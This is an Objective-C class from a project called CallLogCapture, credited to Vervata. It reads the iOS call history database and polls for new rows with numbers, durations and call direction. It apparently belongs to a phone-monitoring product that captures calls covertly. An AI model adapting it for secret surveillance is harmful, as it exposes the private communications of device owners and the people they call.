/**
 - Project name :  CallLogCapture 
 - Class name   :  CallLogCaptureDAO
 - Version      :  1.0  
 - Purpose      :  For Call Log Capturing Component
 - Copy right   :  30/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "CallLogCaptureDAO.h"
#import "FMDatabase.h"
#import "CallLog.h"
#import "FxEventEnums.h"
#import "DefStd.h"

@interface CallLogCaptureDAO (private)
- (NSArray *) selectCallHistory: (NSString *) aSql;
@end

@implementation CallLogCaptureDAO

static NSString	* const kSelectCallHistory1			= @"SELECT ROWID,address,duration,flags from call where ROWID in (SELECT max(ROWID) from call)";
static NSString	* const kSelectCallHistory2			= @"SELECT ROWID,address,duration,flags from call WHERE ROWID > %d";
static NSString * const kSelectCallHistory3			= @"SELECT ROWID,address,duration,flags from call ORDER BY ROWID DESC LIMIT 5";
static NSString	* const kSelectCallHistoryMaxRowID	= @"SELECT max(ROWID) from call";

/**
 - Method name: init
 - Purpose:This method is used to initalize CallLogCaptureDAO
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (id) init {
	if ((self = [super init])) {
		mSMSDB = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
		[mSMSDB retain];
		[mSMSDB open];
	}
	return (self);
}

- (NSArray *) selectCallHistory {
	NSArray *callLogs = [self selectCallHistory:kSelectCallHistory1];
	return (callLogs);
}

- (NSArray *) selectCallHistoryNewerRowID: (NSUInteger) aRowID {
	NSString *sql = [NSString stringWithFormat:kSelectCallHistory2, aRowID];
	NSArray *callLogs = [self selectCallHistory:sql];
	return (callLogs);
}

- (CallLog *) selectCallHistoryWithLastRowEqual: (NSString *) aTelephoneNumber {
	CallLog * callLog = nil;
	NSArray *callLogs = [self selectCallHistory:kSelectCallHistory3];
	for (CallLog *call in callLogs) {
		if ([[call mContactNumber] isEqualToString:aTelephoneNumber]) {
			callLog = [[CallLog alloc] init];
			[callLog setMDuration:[call mDuration]];
			[callLog setMCallState:[call mCallState]];
			[callLog setMContactNumber:[call mContactNumber]];
			[callLog setMCallHistoryROWID:[call mCallHistoryROWID]];
			[callLog autorelease];
			break;
		}
	}
	return (callLog);
}

- (NSUInteger) maxRowID {
	NSUInteger maxRowID = 1;
	FMResultSet* resultSet = [mSMSDB executeQuery:kSelectCallHistoryMaxRowID];
	if ([resultSet next]) {
		maxRowID = [resultSet intForColumnIndex:0];
	}
	return (maxRowID);
}

/**
 - Method name: selectCallHistory:
 - Purpose:This method is used to select call log
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of CallLog objects
*/

- (NSArray *) selectCallHistory: (NSString *) aSql {
	NSMutableArray* requestArray = [[NSMutableArray alloc] init];
	FMResultSet* resultSet = [mSMSDB executeQuery:aSql];
	while ([resultSet next]) {
	     CallLog *callLog=[[CallLog alloc] init];
		[callLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];
		 [callLog setMContactNumber:[resultSet stringForColumnIndex:1]];
	     NSUInteger duration=[resultSet intForColumnIndex:2];
		 [callLog setMDuration:duration];
		 int flags=[resultSet intForColumnIndex:3];
		DLog (@"Call flags value = %d", flags);
		 switch (flags) {
		   case kCallStateIncoming:
			     if(duration==0)
				   [callLog setMCallState:kEventDirectionMissedCall];
				 else
				   [callLog setMCallState:kEventDirectionIn];	
			break;
			case  kCallStateIncomingPrivate:
				 if(duration==0)
					 [callLog setMCallState:kEventDirectionMissedCall];
				 else
					 [callLog setMCallState:kEventDirectionIn];
				 break;
			 case  kCallStateOutGoing:
				 [callLog setMCallState:kEventDirectionOut];
				 break;
			 case kCallStateIncomingPrivateDecline:
			 case kCallStateIncomingDecline:
				 [callLog setMCallState:kEventDirectionMissedCall];
				 break;
			default:
			    [callLog setMCallState:kEventDirectionOut]; 
		    break;
		}
		[requestArray addObject:callLog];
		[callLog release];
		callLog=nil;
		DLog (@"Direction:%d",flags); 
 }
	return [requestArray autorelease];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method.Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mSMSDB close];
	[mSMSDB release];
	mSMSDB=nil;
	[super dealloc];
}

@end
